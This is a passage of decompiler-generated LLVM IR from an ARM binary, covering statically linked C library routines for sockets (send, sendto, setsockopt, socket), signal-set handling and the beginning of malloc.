  %v3_1b250 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1b250 = sext i16 %v3_1b250 to i32
  %v0_1b254 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b254 = sub i32 0, %v0_1b254
  store i32 %v1_1b254, i32* %r2.global-to-local, align 4
  %v3_1b258 = add i32 %v4_1b250, %v0_1b24c
  %v4_1b258 = inttoptr i32 %v3_1b258 to i32*
  store i32 %v1_1b254, i32* %v4_1b258, align 4
  %v2_1b260.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1b260

dec_label_pc_1b260:                               ; preds = %entry, %dec_label_pc_1b248
  %v1_1b264 = phi i32 [ %v0_1b238, %entry ], [ -1, %dec_label_pc_1b248 ]
  %v2_1b260 = phi i32 [ %v3_1b22c, %entry ], [ %v2_1b260.pre, %dec_label_pc_1b248 ]
  store i32 %v2_1b260, i32* @r7, align 4
  ret i32 %v1_1b264

; uselistorder directives
  uselistorder i32 %v0_1b238, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b260, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1b268:
  %v0_1b268 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b268, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b268
  %v5_1b268 = udiv i32 %arg2, 4
  %v6_1b268 = and i32 %v5_1b268, %arg1
  %v3_1b26c = load i32, i32* @lr, align 4
  %v8_1b26c = shl i32 %v6_1b268, %v3_1b26c
  %v9_1b26c = and i32 %v8_1b26c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1b268, %bb
  %v10_1b26c = phi i32 [ %arg1, %dec_label_pc_1b268 ], [ %v9_1b26c, %bb ]
  ret i32 %v10_1b26c

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1b274 = load i32, i32* @r4, align 4
  store i32 %v3_1b274, i32* %stack_var_-24, align 4
  %v6_1b274 = load i32, i32* @r5, align 4
  %v9_1b274 = load i32, i32* @r6, align 4
  %v12_1b274 = load i32, i32* @r7, align 4
  %v15_1b274 = load i32, i32* @r8, align 4
  %v18_1b274 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @ip, align 4
  %v4_1b280 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 14008) to i32*), align 4
  %v2_1b284 = icmp eq i32 %v4_1b280, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_1b284, label %dec_label_pc_1b29c, label %entry.dec_label_pc_1b2a4_crit_edge

entry.dec_label_pc_1b2a4_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1b2a4

dec_label_pc_1b29c:                               ; preds = %entry
  store i32 %v3_1b274, i32* @r4, align 4
  store i32 %v9_1b274, i32* @r6, align 4
  store i32 %v12_1b274, i32* @r7, align 4
  store i32 %v15_1b274, i32* @r8, align 4
  %v0_1b2a0 = call i32 @__sys_send()
  br label %dec_label_pc_1b2a4

dec_label_pc_1b2a4:                               ; preds = %entry.dec_label_pc_1b2a4_crit_edge, %dec_label_pc_1b29c
  %v0_1b2a4 = call i32 @__libc_enable_asynccancel()
  %v0_1b2a8 = load i32, i32* @r6, align 4
  store i32 %v0_1b2a8, i32* @r1, align 4
  store i32 %v0_1b2a4, i32* @r5, align 4
  %v0_1b2b8 = load i32, i32* @r4, align 4
  store i32 %v0_1b2b8, i32* @r0, align 4
  %v0_1b2bc = call i32 @__sys_send()
  store i32 %v0_1b2bc, i32* @r4, align 4
  %v0_1b2c4 = load i32, i32* @r5, align 4
  %v1_1b2c8 = call i32 @__libc_disable_asynccancel(i32 %v0_1b2c4)
  %v0_1b2cc = load i32, i32* @r4, align 4
  %v2_1b2d0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1b2d0, i32* @r4, align 4
  store i32 %v6_1b274, i32* @r5, align 4
  store i32 %v9_1b274, i32* @r6, align 4
  store i32 %v12_1b274, i32* @r7, align 4
  store i32 %v15_1b274, i32* @r8, align 4
  store i32 %v18_1b274, i32* @lr, align 4
  ret i32 %v0_1b2cc

; uselistorder directives
  uselistorder label %dec_label_pc_1b2a4, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1b2e0 = load i32, i32* @r4, align 4
  store i32 %v3_1b2e0, i32* %stack_var_-16, align 4
  %v0_1b2f4 = load i32, i32* @r0, align 4
  store i32 %v0_1b2f4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1b2f4, -4095
  br i1 %tmp, label %dec_label_pc_1b31c, label %dec_label_pc_1b304

dec_label_pc_1b304:                               ; preds = %entry
  %v0_1b308 = call i32 @__aeabi_read_tp()
  %v3_1b30c = load i16, i16* @global_var_2c068.414, align 2
  %v4_1b30c = sext i16 %v3_1b30c to i32
  %v0_1b310 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b310 = sub i32 0, %v0_1b310
  store i32 %v1_1b310, i32* %r2.global-to-local, align 4
  %v3_1b314 = add i32 %v4_1b30c, %v0_1b308
  %v4_1b314 = inttoptr i32 %v3_1b314 to i32*
  store i32 %v1_1b310, i32* %v4_1b314, align 4
  %v2_1b31c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1b31c

dec_label_pc_1b31c:                               ; preds = %entry, %dec_label_pc_1b304
  %v1_1b320 = phi i32 [ %v0_1b2f4, %entry ], [ -1, %dec_label_pc_1b304 ]
  %v2_1b31c = phi i32 [ %v3_1b2e0, %entry ], [ %v2_1b31c.pre, %dec_label_pc_1b304 ]
  store i32 %v2_1b31c, i32* @r4, align 4
  ret i32 %v1_1b320

; uselistorder directives
  uselistorder i32 %v0_1b2f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b31c, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1b324:
  %v0_1b324 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b324, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b324
  %v2_1b328 = load i32, i32* @r4, align 4
  %v3_1b328 = load i32, i32* @sp, align 4
  %v8_1b328 = ashr i32 %v2_1b328, %v3_1b328
  %v9_1b328 = and i32 %v8_1b328, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1b324, %bb
  %v10_1b328 = phi i32 [ %arg1, %dec_label_pc_1b324 ], [ %v9_1b328, %bb ]
  ret i32 %v10_1b328

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1b32c = load i32, i32* @r4, align 4
  store i32 %v3_1b32c, i32* %stack_var_-32, align 4
  %v6_1b32c = load i32, i32* @r5, align 4
  %v9_1b32c = load i32, i32* @r6, align 4
  %v12_1b32c = load i32, i32* @r7, align 4
  %v15_1b32c = load i32, i32* @r8, align 4
  %v18_1b32c = load i32, i32* @sb, align 4
  %v21_1b32c = load i32, i32* @sl, align 4
  %v24_1b32c = load i32, i32* @lr, align 4
  %v4_1b33c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 14008) to i32*), align 4
  %v2_1b344 = icmp eq i32 %v4_1b33c, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_1b344, label %dec_label_pc_1b364, label %dec_label_pc_1b370

dec_label_pc_1b364:                               ; preds = %entry
  store i32 %v3_1b32c, i32* @r4, align 4
  store i32 %v12_1b32c, i32* @r7, align 4
  store i32 %v15_1b32c, i32* @r8, align 4
  store i32 %v18_1b32c, i32* %sb.global-to-local, align 4
  %v0_1b36c = call i32 @__sys_sendto()
  br label %dec_label_pc_1b370

dec_label_pc_1b370:                               ; preds = %entry, %dec_label_pc_1b364
  %v0_1b370 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1b370, i32* @r5, align 4
  %v0_1b384 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1b384, i32* @r0, align 4
  %v0_1b38c = call i32 @__sys_sendto()
  store i32 %v0_1b38c, i32* @r4, align 4
  %v0_1b394 = load i32, i32* @r5, align 4
  %v1_1b398 = call i32 @__libc_disable_asynccancel(i32 %v0_1b394)
  %v0_1b39c = load i32, i32* @r4, align 4
  %v2_1b3a4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1b3a4, i32* @r4, align 4
  store i32 %v6_1b32c, i32* @r5, align 4
  store i32 %v9_1b32c, i32* @r6, align 4
  store i32 %v12_1b32c, i32* @r7, align 4
  store i32 %v15_1b32c, i32* @r8, align 4
  store i32 %v18_1b32c, i32* @sb, align 4
  store i32 %v21_1b32c, i32* @sl, align 4
  store i32 %v24_1b32c, i32* @lr, align 4
  ret i32 %v0_1b39c

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b370, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1b3b4 = load i32, i32* @r4, align 4
  store i32 %v3_1b3b4, i32* %stack_var_-12, align 4
  %v0_1b3c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1b3c4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1b3c4, -4095
  br i1 %tmp, label %dec_label_pc_1b3ec, label %dec_label_pc_1b3d4

dec_label_pc_1b3d4:                               ; preds = %entry
  %v0_1b3d8 = call i32 @__aeabi_read_tp()
  %v3_1b3dc = load i16, i16* @global_var_2c068.414, align 2
  %v4_1b3dc = sext i16 %v3_1b3dc to i32
  %v0_1b3e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b3e0 = sub i32 0, %v0_1b3e0
  store i32 %v1_1b3e0, i32* %r2.global-to-local, align 4
  %v3_1b3e4 = add i32 %v4_1b3dc, %v0_1b3d8
  %v4_1b3e4 = inttoptr i32 %v3_1b3e4 to i32*
  store i32 %v1_1b3e0, i32* %v4_1b3e4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1b3ec.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1b3ec

dec_label_pc_1b3ec:                               ; preds = %entry, %dec_label_pc_1b3d4
  %v1_1b3f0 = phi i32 [ %v0_1b3c4, %entry ], [ -1, %dec_label_pc_1b3d4 ]
  %v2_1b3ec = phi i32 [ %v3_1b3b4, %entry ], [ %v2_1b3ec.pre, %dec_label_pc_1b3d4 ]
  store i32 %v2_1b3ec, i32* @r4, align 4
  ret i32 %v1_1b3f0

; uselistorder directives
  uselistorder i32 %v0_1b3c4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b3ec, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1b3f4:
  %v0_1b3f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b3f4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b3f4
  %v2_1b3f8 = load i32, i32* @r4, align 4
  %v5_1b3f8 = mul i32 %v2_1b3f8, 33554432
  %v6_1b3f8 = and i32 %v5_1b3f8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1b3f4, %bb
  %v7_1b3f8 = phi i32 [ %arg1, %dec_label_pc_1b3f4 ], [ %v6_1b3f8, %bb ]
  ret i32 %v7_1b3f8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1b3fc = load i32, i32* @r7, align 4
  store i32 %v3_1b3fc, i32* %stack_var_-8, align 4
  %v0_1b408 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1b408, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1b408, -4095
  br i1 %tmp, label %dec_label_pc_1b430, label %dec_label_pc_1b418

dec_label_pc_1b418:                               ; preds = %entry
  %v0_1b41c = call i32 @__aeabi_read_tp()
  %v3_1b420 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1b420 = sext i16 %v3_1b420 to i32
  %v0_1b424 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b424 = sub i32 0, %v0_1b424
  store i32 %v1_1b424, i32* %r2.global-to-local, align 4
  %v3_1b428 = add i32 %v4_1b420, %v0_1b41c
  %v4_1b428 = inttoptr i32 %v3_1b428 to i32*
  store i32 %v1_1b424, i32* %v4_1b428, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1b430.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1b430

dec_label_pc_1b430:                               ; preds = %entry, %dec_label_pc_1b418
  %v1_1b434 = phi i32 [ %v0_1b408, %entry ], [ -1, %dec_label_pc_1b418 ]
  %v2_1b430 = phi i32 [ %v3_1b3fc, %entry ], [ %v2_1b430.pre, %dec_label_pc_1b418 ]
  store i32 %v2_1b430, i32* @r7, align 4
  ret i32 %v1_1b434

; uselistorder directives
  uselistorder i32 %v0_1b408, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b430, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1b438:
  %v0_1b438 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b438, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b438
  %v2_1b438 = load i32, i32* @sb, align 4
  %v8_1b438 = shl i32 %v2_1b438, %arg2
  %v9_1b438 = and i32 %v8_1b438, %arg1
  %v5_1b43c = sdiv i32 %v9_1b438, 16777216
  %v6_1b43c = and i32 %v5_1b43c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1b438, %bb
  %v7_1b43c = phi i32 [ %arg1, %dec_label_pc_1b438 ], [ %v6_1b43c, %bb ]
  ret i32 %v7_1b43c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_1b458, label %dec_label_pc_1b450

dec_label_pc_1b450:                               ; preds = %entry
  %v7_1b454 = icmp slt i32 %arg2, 65
  br i1 %v7_1b454, label %dec_label_pc_1b474, label %dec_label_pc_1b458

dec_label_pc_1b458:                               ; preds = %dec_label_pc_1b450, %entry
  %v0_1b45c = call i32 @__aeabi_read_tp()
  %v3_1b460 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1b460 = sext i16 %v3_1b460 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_1b46c = add i32 %v4_1b460, %v0_1b45c
  %v4_1b46c = inttoptr i32 %v3_1b46c to i32*
  store i32 22, i32* %v4_1b46c, align 4
  %v0_1b47c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b47c

dec_label_pc_1b474:                               ; preds = %dec_label_pc_1b450
  %v0_1b474 = call i32 @__sigaddset()
  store i32 %v0_1b474, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b47c

dec_label_pc_1b47c:                               ; preds = %dec_label_pc_1b458, %dec_label_pc_1b474
  %v0_1b47c = phi i32 [ %v0_1b47c.pre, %dec_label_pc_1b458 ], [ %v0_1b474, %dec_label_pc_1b474 ]
  ret i32 %v0_1b47c

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b47c, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1b498 = add i32 %tmp, 4
  %v3_1b498 = inttoptr i32 %v2_1b498 to i32*
  store i32 0, i32* %v3_1b498, align 4
  %v1_1b49c = load i32, i32* %r3.global-to-local, align 4
  %v2_1b49c = inttoptr i32 %v1_1b49c to i32*
  store i32 0, i32* %v2_1b49c, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1b4a4 = load i32, i32* @r4, align 4
  store i32 %v3_1b4a4, i32* %stack_var_-16, align 4
  %v6_1b4a4 = load i32, i32* @r5, align 4
  %v9_1b4a4 = load i32, i32* @r6, align 4
  %v7_1b4ac = icmp eq i32 %arg2, -1
  br i1 %v7_1b4ac, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_1b4b4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_1b4d0

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_1b4d8

dec_label_pc_1b4d0:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r6, align 4
  %v7_1b4d4 = icmp slt i32 %arg1, 65
  br i1 %v7_1b4d4, label %dec_label_pc_1b4f4, label %dec_label_pc_1b4d8

dec_label_pc_1b4d8:                               ; preds = %.thread16, %dec_label_pc_1b4d0
  %v0_1b4dc = call i32 @__aeabi_read_tp()
  %v3_1b4e0 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1b4e0 = sext i16 %v3_1b4e0 to i32
  store i32 %v4_1b4e0, i32* @r2, align 4
  store i32 22, i32* @r3, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_1b4ec = add i32 %v4_1b4e0, %v0_1b4dc
  %v4_1b4ec = inttoptr i32 %v3_1b4ec to i32*
  store i32 22, i32* %v4_1b4ec, align 4
  %v0_1b54c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_1b4f4:                               ; preds = %dec_label_pc_1b4d0
  %v2_1b4f4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1b4f4, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_1b4fc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1b4fc, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_1b50c = call i32 @__sigaddset()
  %v0_1b514 = load i32, i32* @r5, align 4
  store i32 %v0_1b514, i32* %r1.global-to-local, align 4
  %v0_1b518 = load i32, i32* @r6, align 4
  %v2_1b518 = add i32 %v0_1b518, 13104
  %v2_1b51c = call i32 @__GI___sigismember(i32 %v2_1b518, i32 %v0_1b514)
  store i32 %v2_1b4f4, i32* %r1.global-to-local, align 4
  %v0_1b530 = load i32, i32* @r5, align 4
  %v3_1b53c = call i32 @__libc_sigaction(i32 %v0_1b530, i32 %v2_1b4f4, i32 %v2_1b4b4)
  %v1_1b540 = icmp slt i32 %v3_1b53c, 0
  br i1 %v1_1b540, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_1b4f4
  %v5_1b544 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_1b544, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_1b4f4
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_1b4d8, %bb32
  %v0_1b54c = phi i32 [ %v5_1b544, %bb31 ], [ %v0_1b54c.pre, %dec_label_pc_1b4d8 ], [ -1, %bb32 ]
  %v2_1b554 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b554, i32* @r4, align 4
  store i32 %v6_1b4a4, i32* @r5, align 4
  store i32 %v9_1b4a4, i32* @r6, align 4
  ret i32 %v0_1b54c

; uselistorder directives
  uselistorder i32 %v2_1b4f4, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b4d8, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1b568 = add i32 %arg2, -1
  %v3_1b56c = udiv i32 %v1_1b568, 32
  %v4_1b570 = mul nuw nsw i32 %v3_1b56c, 4
  %v5_1b570 = add i32 %v4_1b570, %arg1
  %v6_1b570 = inttoptr i32 %v5_1b570 to i32*
  %v7_1b570 = load i32, i32* %v6_1b570, align 4
  %v1_1b574 = urem i32 %v1_1b568, 32
  %v7_1b57c = shl i32 1, %v1_1b574
  %v8_1b57c = and i32 %v7_1b570, %v7_1b57c
  %v10_1b57c = icmp ne i32 %v8_1b57c, 0
  %. = zext i1 %v10_1b57c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_1b568, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_1b58c = load i32, i32* @r1, align 4
  %v1_1b58c = add i32 %v0_1b58c, -1
  %v3_1b590 = udiv i32 %v1_1b58c, 32
  %v0_1b594 = load i32, i32* @r0, align 4
  %v4_1b594 = mul nuw nsw i32 %v3_1b590, 4
  %v5_1b594 = add i32 %v0_1b594, %v4_1b594
  %v6_1b594 = inttoptr i32 %v5_1b594 to i32*
  %v7_1b594 = load i32, i32* %v6_1b594, align 4
  %v1_1b598 = urem i32 %v1_1b58c, 32
  %v7_1b5a0 = shl i32 1, %v1_1b598
  %v8_1b5a0 = or i32 %v7_1b594, %v7_1b5a0
  store i32 %v8_1b5a0, i32* %v6_1b594, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1b58c, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1b5b0 = add i32 %arg2, -1
  %v3_1b5b4 = udiv i32 %v1_1b5b0, 32
  %v4_1b5b8 = mul nuw nsw i32 %v3_1b5b4, 4
  %v5_1b5b8 = add i32 %v4_1b5b8, %arg1
  %v6_1b5b8 = inttoptr i32 %v5_1b5b8 to i32*
  %v7_1b5b8 = load i32, i32* %v6_1b5b8, align 4
  %v1_1b5bc = urem i32 %v1_1b5b0, 32
  %tmp = shl i32 -1, %v1_1b5bc
  %v8_1b5c4 = add i32 %tmp, -1
  %v9_1b5c4 = and i32 %v7_1b5b8, %v8_1b5c4
  store i32 %v9_1b5c4, i32* %v6_1b5b8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1b5b0, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_1b5d4 = udiv i32 %arg1, 256
  store i32 %v3_1b5d4, i32* %r1.global-to-local, align 4
  %v2_1b5d8 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_1b5d8, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_1b5e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1b5d8, i32 %v0_1b5e4)
  %v0_1b5e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b5e8 = add i32 %v0_1b5e8, 1048320
  %v3_1b5ec = udiv i32 %v1_1b5e8, 65536
  %v1_1b5f0 = and i32 %v3_1b5ec, 8
  %v6_1b5f4 = shl i32 %v0_1b5e8, %v1_1b5f0
  %v1_1b5f8 = add i32 %v6_1b5f4, 520192
  %v3_1b5fc = udiv i32 %v1_1b5f8, 65536
  %v1_1b600 = and i32 %v3_1b5fc, 4
  %v6_1b604 = shl i32 %v6_1b5f4, %v1_1b600
  %v1_1b608 = add i32 %v6_1b604, 245760
  %v3_1b60c = udiv i32 %v1_1b608, 65536
  %v1_1b610 = and i32 %v3_1b60c, 2
  %v6_1b614 = shl i32 %v6_1b604, %v1_1b610
  store i32 %v6_1b614, i32* %r1.global-to-local, align 4
  %v1_1b618 = sub nsw i32 13, %v1_1b5f0
  %v2_1b61c = sub nsw i32 %v1_1b618, %v1_1b600
  %v3_1b620 = udiv i32 %v6_1b614, 32768
  %v4_1b620 = sub nuw nsw i32 -1, %v3_1b620
  %v4_1b624 = udiv i32 %v6_1b614, 16384
  %v5_1b624 = and i32 %v4_1b624, %v4_1b620
  %v2_1b628 = sub nsw i32 %v2_1b61c, %v1_1b610
  %v2_1b62c = add nsw i32 %v2_1b628, %v5_1b624
  %v1_1b630 = add nsw i32 %v2_1b62c, 6
  %v0_1b634 = load i32, i32* %ip.global-to-local, align 4
  %v6_1b634 = lshr i32 %v0_1b634, %v1_1b630
  %v3_1b638 = mul nsw i32 %v2_1b62c, 4
  %v1_1b63c = add nsw i32 %v3_1b638, 32
  %v1_1b640 = urem i32 %v6_1b634, 4
  %v2_1b644 = or i32 %v1_1b640, %v1_1b63c
  ret i32 %v2_1b644

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1b64c = load i32, i32* @r4, align 4
  %v6_1b64c = load i32, i32* @r5, align 4
  %v9_1b64c = load i32, i32* @r6, align 4
  %v12_1b64c = load i32, i32* @r7, align 4
  %v15_1b64c = load i32, i32* @r8, align 4
  %v18_1b64c = load i32, i32* @sb, align 4
  %v21_1b64c = load i32, i32* @sl, align 4
  %v24_1b64c = load i32, i32* @fp, align 4
  %v27_1b64c = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r1.global-to-local, align 4
  %v4_1b660 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 108) to i32*), align 4
  store i32 %v4_1b660, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_1b66c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 68) to i32*), align 4
  store i32 %v4_1b66c, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_1b660, i32* %r2.global-to-local, align 4
  %v2_1b678 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1b678, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %ip.global-to-local, align 4
  %v4_1b684 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 112) to i32*), align 4
  store i32 %v4_1b684, i32* %ip.global-to-local, align 4
  store i32 112272, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1b684)
  %v0_1b690 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1b690, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r1, align 4
